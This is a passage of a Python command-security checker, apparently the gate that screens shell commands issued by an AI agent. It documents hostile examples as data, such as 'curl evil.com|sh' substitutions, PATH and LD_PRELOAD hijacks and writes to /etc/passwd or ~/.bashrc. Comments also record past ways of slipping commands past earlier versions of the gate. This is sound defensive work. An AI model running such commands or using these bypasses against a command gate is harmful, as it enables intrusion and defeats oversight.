                check_id=CheckID.GIT_COMMIT_SUBSTITUTION,
                message="Git commit message contains command substitution patterns",
            )

    # Remainder after the closing quote: ignore plain whitespace, additional
    # git flags, and trailing newlines. Only flag genuine shell operators
    # in unquoted regions of the remainder. Strip allowlisted output-capture
    # patterns (`2>&1`, trailing `| tail/head/cat/wc/grep ...`) first — bug
    # 2214: these are legitimate shell composition for capturing git output.
    if remainder.strip():
        # Per-segment evaluation (bug 2446, follow-up to 2316): a trailing
        # ``&& <cmd>`` is legitimate shell sequencing, not injection. Strip
        # the leading ``&&`` and re-validate the trailing segment through
        # the full bash security pipeline — every check (including check 12
        # again if it's another git commit) runs against the trailing
        # command on its own merits. If the trailing segment is safe, the
        # whole chain is safe. Note: ``;`` and ``|`` stay blocked here
        # because they are higher-risk (``;`` is the classic injection
        # operator; ``|`` exfiltrates stdout to the next command).
        and_chain = re.match(r"\A\s*&&\s+(.+)\Z", remainder, re.DOTALL)
        if and_chain:
            trailing = and_chain.group(1).strip()
            if trailing:
                return check_bash_command(trailing)

        unquoted_rem = _extract_unquoted(remainder)
        unquoted_rem = _strip_benign_commit_remainder(unquoted_rem)
        if re.search(r"[;|&()`]|\$\(|\$\{", unquoted_rem):
            return BashSecurityResult(
                safe=False,
                check_id=CheckID.GIT_COMMIT_SUBSTITUTION,
                message="Git commit has shell metacharacters after -m argument",
            )
        if re.search(r"[<>]", unquoted_rem):
            return BashSecurityResult(
                safe=False,
                check_id=CheckID.GIT_COMMIT_SUBSTITUTION,
                message="Git commit remainder contains unquoted redirect operator",
            )

    # Message starting with dash — flag obfuscation
    if message_content.startswith("-"):
        return BashSecurityResult(
            safe=False,
            check_id=CheckID.OBFUSCATED_FLAGS,
            message="Git commit message starts with dash (potential flag obfuscation)",
        )

    return _SAFE


def _check_obfuscated_flags(command: str, base_cmd: str) -> BashSecurityResult:
    """Check 4: ANSI-C quoting, locale quoting, empty-quote flag hiding."""
    # Echo without operators is safe
    if base_cmd == "echo" and not re.search(r"[|&;]", command):
        return _SAFE

    # Git's documented multi-paragraph commit syntax uses an empty `-m ""`
    # between two non-empty `-m "..."` args to insert a blank paragraph.
    # The empty-quote heuristics below would false-positive on it (bug 2214,
    # GutenForge BR-D #2209). Detect and skip the empty-quote heuristics
    # for this exact pattern; ANSI-C / locale-quoting checks still apply.
    skip_empty_quote_checks = _is_git_commit_multi_paragraph(command)

    # Quote-aware detection of ANSI-C ($'...') and locale ($"...") quoting.
    # Only genuine shell-level constructs are reported — a $' or $" sequence
    # buried inside a quoted string literal is literal text, not a quoting
    # construct, and must not fire (task 2652: raw regex scanning tripped
    # check-4 on a `$` before a closing `'` inside a python -c body).
    dollar_quote_kinds = _scan_shell_level_dollar_quotes(command)

    # ANSI-C quoting: $'...' — always blocked (no legitimate allowlist).
    if "ansi-c" in dollar_quote_kinds:
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains ANSI-C quoting ($'...') which can hide characters",
        )

    # Locale quoting: $"..."
    # Threat model: $"..." is bash i18n syntax; theoretically can carry hidden
    # characters. In practice it is only used as an attack primitive when
    # combined with command-execution tools. Allow it when the surrounding
    # command is a known-safe read-only text tool (grep/sed/awk/find), where
    # the pattern is the legitimate use case (passing localized search terms).
    # Loosen for task #2096-class false positives while keeping the block
    # active for cmd/eval/sh/bash/python/node/etc.
    #
    # Per-segment evaluation (bug 2316): split on top-level `;`/`&&`/`||`/`|`
    # and evaluate the allowlist against EACH chained segment's own first
    # word. Without this, a safe head (`git status; python -c $"x"`) would
    # whitewash an exec primitive in a later segment.
    if "locale" in dollar_quote_kinds:
        segments = _split_command_segments(command)
        # Fall back to whole-command behavior when the splitter produced no
        # segments (defensive — empty/whitespace-only input).
        if not segments:
            segments = [command]
        for segment in segments:
            if "locale" not in _scan_shell_level_dollar_quotes(segment):
                continue
            seg_base = _get_base_command(segment)
            if seg_base not in _LOCALE_QUOTING_SAFE_BASES:
                return BashSecurityResult(
                    safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
                    message="Command contains locale quoting ($\"...\") which can hide characters",
                )

    # Empty ANSI-C or locale quotes before dash: $''-exec or $""-exec
    if not skip_empty_quote_checks and re.search(r"""\$['\"]{2}\s*-""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty special quotes before dash",
        )

    # Empty quote pairs before dash: ''-exec, ""-exec
    if not skip_empty_quote_checks and re.search(
        r"""(?:^|\s)(?:''|""){1,}\s*-""", command,
    ):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty quotes before dash (potential bypass)",
        )

    # Empty quote pairs inside a flag: -''la, -""la (splitting flag to evade filters)
    if re.search(r"""-\w*(?:''|"")\w""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty quotes inside flag (obfuscation)",
        )

    # Empty quote pairs adjacent to quoted dash: """-f"
    # One pair is enough: any run of pairs ending in a quoted dash contains
    # a single pair followed by the quoted dash. The old ``{1,}`` quantifier
    # was unanchored and backtracked quadratically on long quote runs
    # (sandbox-07: 50k quotes took ~28 s).
    if re.search(r"""(?:""|'')['\"]-""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty quote pair adjacent to quoted dash",
        )

    # 3+ consecutive quotes at word start
    if re.search(r"""(?:^|\s)['\"]{3,}""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains consecutive quote chars at word start",
        )

    return _SAFE


def _extract_dollar_paren_inners(text: str) -> list[str]:
    """Return the inner text of every top-level ``$(...)`` substitution.

    Naive nesting-aware scan — does not handle quoted parens inside the
    substitution, but the surrounding caller has already stripped quoted
    content.
    """
    return _extract_paren_inners(text, "$")


def _extract_paren_inners(text: str, sigil: str) -> list[str]:
    """Return the inner text of every top-level ``<sigil>(...)`` construct.

    *sigil* is ``"$"`` for command substitution or ``"<"`` for process
    substitution. Same naive nesting-aware scan as
    ``_extract_dollar_paren_inners``.
    """
    inners: list[str] = []
    i = 0
    while i < len(text) - 1:
        if text[i] == sigil and text[i + 1] == "(":
            depth = 1
            j = i + 2
            start = j
            while j < len(text) and depth > 0:
                if text[j] == "(":
                    depth += 1
                elif text[j] == ")":
                    depth -= 1
                    if depth == 0:
                        inners.append(text[start:j])
                        break
                j += 1
            i = j + 1
        else:
            i += 1
    return inners


def _is_safe_substitution_inner(inner: str) -> bool:
    """True if the body of a ``$(...)`` is a flat pipe/chain of safe commands.

    Task 2722: real dev commands routinely pipe or chain read-only commands
    inside ``$(...)`` — e.g.::

        FILES=$(grep -rln "pat" tests/ | tr "\\n" " ")
        PYBIN=$( [ -x .venv/bin/python ] && echo .venv/bin/python || echo python )

    The prior implementation (fixes 2284/2308) rejected on the mere *presence*
    of a ``|``/``&&``/``;`` separator, so both of the above benign commands
    tripped check-8 and killed live agent runs. Mirroring the 2652 principle
    (validate structure, don't pattern-match the raw string) we instead SPLIT
    the inner on shell-level separators (reusing the quote-aware check-4
    tokenizer ``_split_command_segments``) and return True only when EVERY
    sub-command base is in ``_SAFE_SUBSTITUTION_COMMANDS`` and NONE is in
    ``_DANGEROUS_SUBSTITUTION_COMMANDS``.

    Nested substitution stays an automatic REJECT — we do not recurse. Any
    ``$(...)``/backtick/``<()``/``>()``/``${...}`` form inside the inner blocks
    the whole substitution; only a flat chain of allowlisted commands passes.
    """
    stripped = inner.strip()
    if not stripped:
        return False
    # Nested substitution / expansion inside an inner is never allowed — only a
    # flat pipe/chain of safe commands. Rejecting these fails closed and stops
    # e.g. `$(echo $(whoami))` or `$(grep x <(curl evil))` from slipping through
    # on a safe-looking base command.
    for forbidden in ("`", "$(", "${", "<(", ">("):
        if forbidden in stripped:
            return False
    segments = _split_command_segments(stripped)
    if not segments:
        return False
    for segment in segments:
        # SR-2722 S3: reject a leading ``VAR=value`` environment-assignment
        # prefix instead of stripping it — otherwise
        # ``$(PATH=/tmp/evil grep x f)`` / ``$(LD_PRELOAD=/tmp/e.so cat f)``
        # hijack the allowlisted base command via a poisoned environment.
        if re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", segment):
            return False
        base = _get_base_command(segment)
        if not base:
            return False
        if base in _DANGEROUS_SUBSTITUTION_COMMANDS:
            return False
        if base not in _SAFE_SUBSTITUTION_COMMANDS:
            return False
        # SR-2722 S1: git is a general-purpose runner - allow it only for
        # read-only, non-RCE subcommands. Membership in the safe set above is
        # necessary but NOT sufficient for git.
        if base == "git" and not _git_substitution_is_read_only(segment):
            return False
        # SR-2722 FP follow-up: go is a general-purpose toolchain runner — allow
        # it only for pure value-emitter subcommands (go env/version/list).
        if base == "go" and not _go_substitution_is_read_only(segment):
            return False
    return True


# Constant-text emitters are NOT allowed inside <(...): a here-string
# (`cmd <<< "text"`) covers that use, and `ls -la <(echo ...)` is the
# command agent_runner's gate canary (_CANARY_COMMAND) and its guard-rail
# tests rely on the gate refusing. Changing this set means changing that
# canary first.
_PROCESS_SUBSTITUTION_EXCLUDED_BASES: frozenset[str] = frozenset({"echo", "printf"})


def _is_safe_process_substitution_inner(inner: str) -> bool:
    """True if ``<(inner)`` only reads data through read-only commands."""
    if not _is_safe_substitution_inner(inner):
        return False
    return all(
        _get_base_command(segment) not in _PROCESS_SUBSTITUTION_EXCLUDED_BASES
        for segment in _split_command_segments(inner.strip())
    )


def _check_command_substitution(unquoted: str) -> BashSecurityResult:
    """Check 8: Backticks and command substitution patterns.

    Threat model: ``$(curl evil.com|sh)`` runs attacker code. BUT
    ``$(git rev-parse HEAD)`` and ``$(date +%Y%m%d)`` are routine dev work
    (task #2096). Loosen ``$(...)`` to allow read-only commands from
    _SAFE_SUBSTITUTION_COMMANDS while keeping the dangerous-command list
    blocked, and keeping all OTHER substitution forms (backticks, ``<()``,
    ``${...}``, etc.) blocked unconditionally.
    """
    # Check for unescaped backticks
    i = 0
    while i < len(unquoted):
        if unquoted[i] == "\\" and i + 1 < len(unquoted):
            i += 2
            continue
        if unquoted[i] == "`":
            return BashSecurityResult(
                safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                message="Command contains backticks (`) for command substitution",
            )
        i += 1

    # Pre-screen $(...) for the allowlist before the broad pattern fires.
    dollar_paren_re = re.compile(r"\$\(")
    if dollar_paren_re.search(unquoted):
        inners = _extract_dollar_paren_inners(unquoted)
        # If every $(...) substitution is safe, strip them before the
        # pattern loop so the broad "$(" pattern does not re-flag them.
        if inners and all(_is_safe_substitution_inner(inner) for inner in inners):
            scrubbed = re.sub(r"\$\([^()]*\)", "", unquoted)
        else:
            scrubbed = unquoted
    else:
        scrubbed = unquoted

    # <(...) process substitution (sandbox-13): `diff <(sort a) <(sort b)`
    # only reads the output of the inner commands, so it gets the same
    # read-only allowlist as $(...) (minus constant-text emitters, see
    # _is_safe_process_substitution_inner). >(...) feeds data INTO a command
    # and stays blocked unconditionally.
    if "<(" in scrubbed:
        process_inners = _extract_paren_inners(scrubbed, "<")
        if process_inners and all(
            _is_safe_process_substitution_inner(inner) for inner in process_inners
        ):
            scrubbed = re.sub(r"<\([^()]*\)", "", scrubbed)

    for pattern, desc in _COMMAND_SUBSTITUTION_PATTERNS:
        if pattern.search(scrubbed):
            return BashSecurityResult(
                safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                message=f"Command contains {desc}",
            )
    return _SAFE


# Opener of the canonical ``$(cat <<'DELIM'`` substitution, matched at a
# ``$(`` position. Only quoted or backslash-escaped delimiters qualify (they
# make the body literal text), and the body must start on the next line.
_CAT_HEREDOC_SUBSTITUTION_OPENER_RE = re.compile(
    r"\$\(\s*cat[ \t]+<<(?P<dash>-?)[ \t]*"
    r"(?:'(?P<sq>[A-Za-z_][A-Za-z0-9_]*)'"
    r'|"(?P<dq>[A-Za-z_][A-Za-z0-9_]*)"'
    r"|\\(?P<bs>[A-Za-z_][A-Za-z0-9_]*))"
    r"[ \t]*\n"
)
_CLOSE_PAREN_RE = re.compile(r"\s*\)")


def _benign_cat_heredoc_substitution_end(command: str, start: int) -> int | None:
    """Return the index just past ``$(cat <<'DELIM' ... DELIM)`` at *start*.

    Returns None when no such substitution starts at *start*. The terminator
    is found the way bash finds it: the FIRST line that is exactly
    ``DELIM`` (leading tabs allowed for ``<<-``). The substitution must close
    right after that line. A lenient or last-match terminator would let text
    after bash's real terminator - which bash executes inside the
    substitution - be skipped as "heredoc body".
    """
    opener = _CAT_HEREDOC_SUBSTITUTION_OPENER_RE.match(command, start)
    if opener is None:
        return None
    delim = opener.group("sq") or opener.group("dq") or opener.group("bs")
    leading_tabs = r"\t*" if opener.group("dash") else ""
    terminator = re.compile(
        rf"^{leading_tabs}{re.escape(delim)}$", re.MULTILINE
    ).search(command, opener.end())
    if terminator is None:
        return None
    close = _CLOSE_PAREN_RE.match(command, terminator.end())
    return close.end() if close else None


def _double_quoted_substitutions(command: str) -> list[tuple[str, str]]:
    """Find the command substitutions bash runs from inside double quotes.

    ``_extract_unquoted`` drops double-quoted text entirely, so check 8 never
    saw ``echo "$(curl ... | sh)"`` although bash executes it (sandbox-01).
    This scanner follows the real nesting - quoting starts afresh inside
    ``$(...)`` - and returns ``(kind, inner)`` for every outermost
    substitution opened while a double-quoted string is open, at any depth
    (``X=$(echo "$(id)")`` included). ``kind`` is ``"$("`` or ``"`"``.

    Single-quoted and ANSI-C (``$'...'``) text is inert and skipped. A
    canonical ``$(cat <<'EOF' ... EOF)`` is skipped as literal text when
    the tokenizer agrees where it ends. An unterminated substitution yields
    the rest of the command as its inner, so a malformed command is judged
    rather than ignored. The substitutions are _scan_shell's, which also
    models comments and heredoc bodies inside them.
    """
    found: list[tuple[str, str]] = []
    covered_until = -1  # end of the last reported one; nested ones are its inner
    for sub in _scan_shell(command).substitutions:
        if sub.start < covered_until:
            continue
        if sub.kind == "$(":
            canonical_end = _benign_cat_heredoc_substitution_end(command, sub.start)
            if canonical_end is not None and canonical_end == sub.inner_end + 1:
                covered_until = canonical_end
                continue
        if not sub.in_double_quotes:
            continue
        found.append((sub.kind, command[sub.inner_start:sub.inner_end]))
        covered_until = sub.inner_end
    return found


# ``${NAME}``, ``${#NAME}``, ``${NAME[0]}``, ``${1}``: plain parameter reads
# with no operator, so they cannot run anything. Normalised to ``$NAME``
# before the safe-substitution check so ``"$(dirname "${BASH_SOURCE[0]}")"``
# is judged on its command, not on the brace form of a variable.
_SIMPLE_PARAMETER_EXPANSION_RE = re.compile(
    r"\$\{#?([A-Za-z_][A-Za-z0-9_]*|[0-9]+)(?:\[[A-Za-z0-9_@*]+\])?\}"
)


def _is_arithmetic_inner(inner: str) -> bool:
    """True if a ``$(`` inner is ``(...)`` whose first paren closes last.

    That is arithmetic expansion ``$((...))``. ``$( (cmd) )`` (a subshell,
    which runs commands) has a space or text around its parens and fails.
    """
    if len(inner) < 2 or inner[0] != "(" or inner[-1] != ")":
        return False
    depth = 0
    last = len(inner) - 1
    for index, ch in enumerate(inner):
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0 and index != last:
                return False
    return depth == 0


def _check_double_quoted_substitution(command: str) -> BashSecurityResult:
    """Check 8, double-quoted form: ``"$(...)"`` and ``"`...`"`` (sandbox-01).

    Bash runs command substitution inside double quotes exactly as it does
    unquoted, so the verdict is the unquoted one: backticks always block, and
    a ``$(...)`` passes only when its inner text passes
    ``_is_safe_substitution_inner`` AND the full pipeline (which catches, for
    example, a redirect to a sensitive path inside the substitution).
    Arithmetic ``$((...))`` passes when it holds no substitution.
    """
    if '"' not in command or ("$(" not in command and "`" not in command):
        return _SAFE
    for kind, inner in _double_quoted_substitutions(command):
        if kind == "`":
            return BashSecurityResult(
                safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                message="Command contains backticks (`) for command substitution inside double quotes",
            )
        if _is_arithmetic_inner(inner):
            if "$(" in inner or "`" in inner:
                return BashSecurityResult(
                    safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                    message="Command contains command substitution inside $((...)) in double quotes",
                )
            continue
        normalized = _SIMPLE_PARAMETER_EXPANSION_RE.sub(r"$\1", inner)
        if not _is_safe_substitution_inner(normalized):
            return BashSecurityResult(
                safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                message="Command contains $() command substitution inside double quotes",
            )
        nested = check_bash_command(inner)
        if not nested.safe:
            return BashSecurityResult(
                safe=False, check_id=nested.check_id,
                message=f"$() inside double quotes: {nested.message}",
            )
    return _SAFE


_WORD_BREAK_CHARS = frozenset(" \t\n;&|<>()")
# Characters that make a redirect target unknowable before run time.
_DYNAMIC_WORD_CHARS = frozenset("$`*?[")
# Absolute redirect targets allowed besides /tmp/...
_ALLOWED_DEVICE_TARGETS = frozenset({"/dev/null", "/dev/stdout", "/dev/stderr"})


def _read_shell_word(command: str, start: int) -> tuple[str, bool, int]:
    """Read the shell word starting at *start*.

    Returns ``(literal, dynamic, end)``. Unquoted, single-quoted and
    double-quoted parts are joined the way bash joins them into one word, so
    ``/tmp/x"/../../y"`` reads as ``/tmp/x/../../y``. ``dynamic`` is True
    when the real value is only known at run time - a ``$`` or backtick
    expansion, an unquoted glob character (``.*`` matches ``..``), or an
    unterminated quote.
    """
    parts: list[str] = []
    dynamic = False
    length = len(command)
    index = start
    while index < length:
        ch = command[index]
        if ch in _WORD_BREAK_CHARS:
            break
        if ch == "\\":
            # \<newline> is a line continuation: both characters vanish, so
            # `/tmp/.\<newline>./x` is `/tmp/../x` to bash.
            if index + 1 < length and command[index + 1] != "\n":
                parts.append(command[index + 1])
            index += 2
            continue
        if ch == "'":
            close = command.find("'", index + 1)
            if close < 0:
                return "".join(parts), True, length
            parts.append(command[index + 1:close])
            index = close + 1
            continue
        if ch == '"':
            inner = index + 1
            while inner < length and command[inner] != '"':
                if command[inner] == "\\" and inner + 1 < length:
                    escaped = command[inner + 1]
                    if escaped in '$`"\\':
                        parts.append(escaped)
                    elif escaped != "\n":  # \<newline> vanishes here too
                        parts.append(command[inner:inner + 2])
                    inner += 2
                    continue
                if command[inner] in "$`":
                    dynamic = True
                parts.append(command[inner])
                inner += 1
            if inner >= length:
                return "".join(parts), True, length
            index = inner + 1
            continue
        if ch in _DYNAMIC_WORD_CHARS:
            dynamic = True
        parts.append(ch)
        index += 1
    return "".join(parts), dynamic, index


def _shell_redirects(command: str) -> list[tuple[str, str, bool]]:
    """Return ``(direction, target, dynamic)`` for each file redirection.

    See _shell_redirect_records, which also returns each operator's index.
    """
    return [
        (direction, target, dynamic)
        for _index, direction, target, dynamic in _shell_redirect_records(command)
    ]


def _shell_redirect_records(command: str) -> list[tuple[int, str, str, bool]]:
    """Return ``(index, direction, target, dynamic)`` per file redirection.

    *direction* is ``"in"`` (``<``, ``<&file``) or ``"out"`` (``>``, ``>>``,
    ``>|``, ``<>``, ``&>``, ``&>>``, ``>&file``). Only shell-level operators
    count: quoted text is skipped, and so are heredoc/here-string operators,
    ``<(``/``>(`` process substitutions (check 8 judges those) and fd
    duplications such as ``2>&1`` or ``>&-``. Code inside ``$(...)`` is
    scanned, double-quoted ``"$(...)"`` included, because bash performs
    those redirections too. Which characters are operators is decided by
    the shared tokenizer (_scan_shell), not by a private quote model
    (BS3121-01: ``echo $'\\'' >> /etc/x`` used to hide the redirect).
    """
    redirects: list[tuple[int, str, str, bool]] = []
    length = len(command)
    operator_positions = _code_char_positions(
        command, "<>&", include_double_quoted=True
    )
    skip_until = 0
    for index in operator_positions:
        if index < skip_until:
            continue  # second character of an operator already handled
        ch = command[index]
        is_dup = False
        if ch == "&" and command.startswith("&>", index):
            direction = "out"
            op_end = index + (3 if command.startswith("&>>", index) else 2)
        elif ch == "<":
            if command.startswith("<<<", index):
                skip_until = index + 3
                continue
            if command.startswith("<<", index):
                skip_until = index + (3 if command.startswith("<<-", index) else 2)
                continue
            if command.startswith("<(", index):
                skip_until = index + 2
                continue
            if command.startswith("<>", index):
                direction, op_end = "out", index + 2
            elif command.startswith("<&", index):
                direction, op_end, is_dup = "in", index + 2, True
            else:
                direction, op_end = "in", index + 1
        elif ch == ">":
            if command.startswith(">(", index):
                skip_until = index + 2
                continue
            if command.startswith(">>", index) or command.startswith(">|", index):
                direction, op_end = "out", index + 2
            elif command.startswith(">&", index):
                direction, op_end, is_dup = "out", index + 2, True
            else:
                direction, op_end = "out", index + 1
        else:
            continue  # a lone & (background / separator)

        skip_until = op_end
        word_start = op_end
        while word_start < length and command[word_start] in " \t":
            word_start += 1
        target, dynamic, _word_end = _read_shell_word(command, word_start)
        if is_dup and not dynamic and (target.isdigit() or target == "-"):
            continue  # 2>&1, >&2, <&0, >&- : fd duplication, not a file
        redirects.append((index, direction, target, dynamic))
    return redirects


_DIRECTORY_CHANGE_WORDS = frozenset({"cd", "pushd", "popd"})
_DIRECTORY_CHANGE_RE = re.compile(r"(?<![\w.-])(?:cd|pushd|popd)(?![\w.-])")
# Kinds a shell word can start with.
_WORD_START_KINDS = frozenset(
    {_K_CODE, _K_ESCAPE, _K_SQ_DELIM, _K_DQ_DELIM, _K_ANSI_DELIM}
)
# The directory the command started in (the agent's working tree).
_START_DIRECTORY = ""


def _directory_after_change(
    command: str, word_end: int, word: str, current: str | None, cdpath: bool
) -> str | None:
    """Directory after the cd/pushd/popd word ending at *word_end*.

    Returns _START_DIRECTORY when the command provably stays inside the
    directory it started in (a literal relative path without ``..``), an
    absolute path after a literal ``cd /abs``, and None when the directory
    cannot be known: no argument (home), ``-``, ``~``, ``+N``, a variable,
    a ``..`` component, ``popd``, or a relative path while CDPATH is set.
    """
    if word == "popd" or current is None:
        return None
    length = len(command)
    index = word_end
    while True:
        while index < length and command[index] in " \t":
            index += 1
        if index >= length or command[index] in _TOKEN_BREAK_CHARS:
            return None  # no argument: $HOME for cd, a swap for pushd
        argument, dynamic, index = _read_shell_word(command, index)
        if not dynamic and argument.startswith("-") and argument != "-":
            continue  # an option (-P, -L, --)
        break
    if dynamic or not argument or argument == "-" or argument[0] in "~+":
        return None
    if ".." in argument.split("/"):
        return None
    if argument.startswith("/"):
        return posixpath.normpath(argument)
    if cdpath:
        return None
    if current == _START_DIRECTORY:
        return _START_DIRECTORY
    return posixpath.normpath(posixpath.join(current, argument))


def _directory_changes(command: str) -> list[tuple[int, str | None]]:
    """``(index, directory)`` for every directory change, in order.

    IND3128-04: ``cd /etc; echo x > f`` writes /etc/f, so a relative
    redirect target is only relative to the working tree while nothing has
    changed directory. Every word that reads as cd, pushd or popd counts,
    wherever it is (a subshell or ``$(...)`` included - over-counting only
    refuses more). *directory* is as _directory_after_change returns it.
    When the command mentions one of those words in a form this scan does
    not resolve as a word (spliced from a variable, inside a string), a
    change to an unknown directory at index 0 is reported instead.
    """
    stripped = re.sub(r"[\\'\"]", "", command)
    mentioned = len(_DIRECTORY_CHANGE_RE.findall(stripped))
    if not mentioned:
        return []
    kinds = _scan_shell(command).kinds
    cdpath = "CDPATH" in stripped
    changes: list[tuple[int, str | None]] = []
    current: str | None = _START_DIRECTORY
    for start, ch in enumerate(command):
        if ch in _TOKEN_BREAK_CHARS or kinds[start] & _KIND_MASK not in _WORD_START_KINDS:
            continue
        if start > 0 and not (
            command[start - 1] in _TOKEN_BREAK_CHARS
            and kinds[start - 1] & _KIND_MASK == _K_CODE
        ):
            continue
        word, dynamic, end = _read_shell_word(command, start)
        if dynamic or word not in _DIRECTORY_CHANGE_WORDS:
            continue
        current = _directory_after_change(command, end, word, current, cdpath)
        changes.append((start, current))
    if len(changes) != mentioned:
        return [(0, None)]
    return changes


def _effective_redirect_target(
    target: str, index: int, changes: list[tuple[int, str | None]]
) -> str | None:
    """The path a literal *target* at *index* writes, after any cd before it.

    Absolute and home targets are returned unchanged, and so is a relative
    one while the command is still in its starting directory. After
    ``cd /abs`` a relative target is joined to it and judged as absolute;
    after a change to an unknown directory None is returned.
    """
    if not target or target.startswith(("/", "~")):
        return target
    directory = _START_DIRECTORY
    for position, after in changes:
        if position >= index:
            break
        directory = after
    if directory is None:
        return None
    if directory == _START_DIRECTORY:
        return target
    return posixpath.join(directory, target)


def _redirect_target_problem(direction: str, target: str, dynamic: bool) -> str | None:
    """Explain why a redirect target is refused, or return None if allowed.

    Allowed: a literal relative path with no ``..`` component, a literal
    ``/tmp/...`` path with no ``..`` component, and
    ``/dev/null``/``/dev/stdout``/``/dev/stderr``. A relative path is only
    relative to the working tree while nothing changed directory first;
    _check_redirections passes the joined path after a ``cd /abs``
    (_effective_redirect_target). The check is textual: a symlink inside
    the tree that points elsewhere is NOT detected.
    """
    if dynamic:
        return (
            "target is only known at run time (variable, substitution, glob "
            "or unterminated quote); use a literal path"
        )
    if not target:
        return "target is missing or empty"
    if target.startswith("~"):
        return "target is in a home directory"
    if ".." in target.split("/"):
        return "target contains a '..' path component"
    if target.startswith("/"):
        if target in _ALLOWED_DEVICE_TARGETS:
            return None
        if target.startswith("/tmp/") and target.strip("/") != "tmp":
            return None
        return "target is an absolute path outside /tmp"
    return None


def _check_redirections(command: str, unquoted: str) -> BashSecurityResult:
    """Checks 9-10: Input and output redirection in unquoted content.

    Threat model: ``cmd > /etc/passwd`` overwrites system files; ``cmd >
    ~/.bashrc`` plants persistent shell hooks. BUT ``cmd > /tmp/out.log``
    and ``cmd >> build.log`` are routine dev patterns that wasted turns
    in task #2096 retries.

    Allowlist (stripped before the literal-char check):
      - 2>&1, 2>/dev/null, >/dev/null, 2>>*.log (existing)
      - > and >> targeting /tmp/, ./, or any relative path (no leading /)
      - >> appending to *.log anywhere
      - ``<<DELIM`` / ``<<-DELIM`` / ``<<'DELIM'`` / ``<<\\DELIM`` heredoc
        opener (delimiter introduces literal text, not a file path)
      - ``<<<word`` here-string operator (literal data, not a file path)

    Explicit denylist (always blocks regardless of above):
      - /etc/, /usr/, /bin/, /sbin/, /boot/, /root/, /sys/, /dev/sd*,
        /dev/disk*, /var/log/ (system logs), ~/.* (dotfile in home),
        /home/*/.* (dotfile in any user home)

    Bug #2285 (task #2309): a bare ``<`` inside ``<<`` or ``<<<`` was being
    treated as input redirection, blocking canonical heredoc and here-string
    patterns (``cat <<EOF`` / ``cat <<<"$VAR"``). Strip the ``<<`` and ``<<<``
    operators *before* the literal-char check so only a true bare ``<``
    (file redirection) trips the block.

    Shared quote-aware pre-pass (task 2652): a genuine redirection operator
    must appear at the shell level — outside every quoted string literal. If
    the ORIGINAL command has no shell-level ``<`` or ``>`` at all, then any
    ``<``/``>`` surfaced by ``_extract_unquoted`` is an artifact of a quoted
    literal (``grep -rn "SATS->ECHO"``) or a quote-tracking desync, never a
    real redirect — so the check short-circuits to safe. This makes check-9/10
    provably immune to operators embedded inside quoted strings while leaving
    every genuine redirect (which is always unquoted) fully validated.
    Redirections inside a double-quoted ``"$(...)"`` are real too, so they
    count here and are validated word by word below.
    """
    if not _code_char_positions(command, "<>", include_double_quoted=True):
        return _SAFE

    # Hard denylist applied to the ORIGINAL unquoted string before any
    # stripping — these targets are never safe even if they textually match
    # the allowlist patterns later.
    danger_target_re = re.compile(
        r">>?\s*("
        r"/etc/|/usr/|/bin/|/sbin/|/boot/|/root/|/sys/|"
        r"/dev/sd[a-z]|/dev/disk|/dev/nvme|/dev/hd[a-z]|"
        r"/var/log/|"
        r"~/\.|/home/[^/]+/\."
        r")"
    )
    if danger_target_re.search(unquoted):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OUTPUT_REDIRECTION,
            message="Command redirects output to a sensitive system path",
        )

    # Word-level target validation (sandbox-08, sandbox-13). The target is
    # read the way bash reads it - quoted parts joined - so neither
    # `>> /tmp/../home/u/.bashrc` nor `> /tmp/x"/../../home/u/.bashrc"` can
    # hide a traversal from the textual allowlist below. Input redirection
    # from a literal relative path (`sort < data/in.txt`) is allowed: it
    # reads nothing the process could not read anyway, while absolute, home
    # and `..` sources stay blocked. A relative target after a cd is judged
    # where it really lands (IND3128-04: `cd /etc; echo x > f` is /etc/f).
    changes = _directory_changes(command)
    for index, direction, target, dynamic in _shell_redirect_records(command):
        effective = target if dynamic else _effective_redirect_target(
            target, index, changes
        )
        if effective is None:
            problem = (
                "target is relative, but an earlier cd/pushd/popd moved to a "
                "directory the checker cannot know; use a /tmp/... path"
            )
        else:
            problem = _redirect_target_problem(direction, effective, dynamic)
            if problem is not None and effective != target:
                problem += f" ({target!r} after the cd before it is {effective!r})"
        if problem is None:
            continue
        if direction == "in":
            return BashSecurityResult(
                safe=False, check_id=CheckID.INPUT_REDIRECTION,
                message=f"Command contains input redirection (<) whose {problem}",
            )
        return BashSecurityResult(
            safe=False, check_id=CheckID.OUTPUT_REDIRECTION,
            message=f"Command contains output redirection (>) whose {problem}",
        )

    # Strip safe stderr/stdout redirection patterns before the literal-char check
    safe_patterns = [
        # Heredoc / here-string operators MUST be stripped BEFORE bare-< check.
        # Order matters: <<< (here-string) must be matched before << (heredoc)
        # so the third < is not misread as a heredoc body word boundary.
        r"<<<",                            # <<<word here-string operator
        r"<<-?\s*\\?['\"]?[\w-]+['\"]?",   # <<EOF, <<-EOF, <<'EOF', <<\EOF
        # A heredoc operator whose quoted delimiter was removed by
        # _extract_unquoted (`cat <<'EOF' > f` -> `cat << > f`).
        r"<<-?",
        # <(...) process substitution: check 8 already judged its inner.
        r"<\(",
        # Input from a literal relative, /tmp or /dev/null path: every
        # target was validated word by word above (no `..`, no ~, no
        # absolute path outside /tmp, nothing dynamic).
        r"<\s*/dev/null",
        r"<\s*/tmp/[\w./-]+",
        r"<\s*\./[\w./-]+",
        r"<\s*[A-Za-z0-9_][\w./-]*",
        r"2\s*>\s*&\s*1",                  # 2>&1
